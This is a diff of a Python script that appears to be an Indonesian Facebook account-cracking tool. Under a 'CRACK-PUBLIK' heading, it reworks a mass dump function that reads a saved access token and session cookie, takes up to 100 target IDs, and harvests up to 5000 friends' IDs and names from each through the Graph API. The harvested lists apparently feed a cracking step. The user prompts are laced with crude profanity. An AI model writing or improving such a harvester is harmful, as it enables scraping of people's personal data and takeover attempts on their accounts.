@@ -878,8 +878,10 @@ def menu(my_name,my_id):
 	if _____alvino__adijaya_____ in ['1']:
 		dump_massal()
 	elif _____alvino__adijaya_____ in ['4']:
-		file()
+		brayen_dump()
 	elif _____alvino__adijaya_____ in ['5']:
+		file()
+	elif _____alvino__adijaya_____ in ['6']:
 		result()
 	elif _____alvino__adijaya_____ in ['0']:
 		os.system('rm -rf .token.txt')
@@ -1075,6 +1077,7 @@ def file():
 def brayen_dump():
 	try:
 		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
 	except IOError:
 		exit()
 	win = '# DUMP ID PUBLIK'
@@ -1100,33 +1103,30 @@ def brayen_dump():
 		sol().print(teks2)
 		exit()
 
+#-------------------[ CRACK-PUBLIK ]----------------#
 def dump_massal():
-	win = '# DUMP ID PUBLIK MASSAL'
-	win2 = mark(win, style='cyan')
-	sol().print(win2)
-	print(x+'['+h+'•'+x+'] MASUKKAN JUMLAH ID (Jangan Lebih Dari 10)')
 	try:
-		jum = int(input(x+'['+p+'f'+x+'] GUA MAU NANYA!BERAPA ID AJG : '))
-	except ValueError:
-		pesan = '# INPUT YANG ANDA MASUKKAN BUKAN ANGKA'
-		pesan2 = mark(pesan, style='red')
-		sol().print(pesan2)
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
 		exit()
-	if jum<1 or jum>10:
-		pesan = '# LOGIN GAGAL SILAKAN GANTI TOKEN'
-		pesan2 = mark(pesan, style='red')
-		sol().print(pesan2)
+	try:
+		jum = int(input('>> Mau Berapa Target Njing ? : '))
+	except ValueError:
+		print('>> Masukkan Angka Anjing, Malah Huruff ')
+		exit()
+	if jum<1 or jum>100:
+		print('>> Gagal Dump Idz ')
 		exit()
 	ses=requests.Session()
 	yz = 0
-	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
 	for met in range(jum):
 		yz+=1
-		kl = input(x+'['+h+str(yz)+x+'] Masukkan ID Ke '+str(yz)+' : ')
+		kl = input('>> Masukkan Idz Yang Ke '+str(yz)+' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
-			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
+			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
 			for mi in col['friends']['data']:
 				try:
 					iso = (mi['id']+'|'+mi['name'])
@@ -1136,17 +1136,20 @@ def dump_massal():
 		except (KeyError,IOError):
 			pass
 		except requests.exceptions.ConnectionError:
-			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
-			lo = mark(li, style='red')
-			sol().print(lo, style='cyan')
+			print('>> Sinyal Loh Kek Kontoll ')
 			exit()
-	tot = '# TOTAL 👉?? %s ID, JNGN LUPA BERDOA DEK'%(len(id))
-	if len(id)==0:
-		tot2 = mark(tot, style='red')
-	else:
-		tot2 = mark(tot, style='green')
-	sol().print(tot2)
-	setting()
+	try:
+		print('')
+		print(f'>> Total Idz Yang Terkumpul🔥{h}'+str(len(id)))
+		setting()
+	except requests.exceptions.ConnectionError:
+		print(f'{x}')
+		print('>> Sinyal Lo kek Kontol ')
+		back()
+	except (KeyError,IOError):
+		print(f'>>{k} Pertemanan Tidak Public {x}')
+		time.sleep(3)
+		setting()
 
 def setting():
 	wl = '# SETTING URUTAN ID'
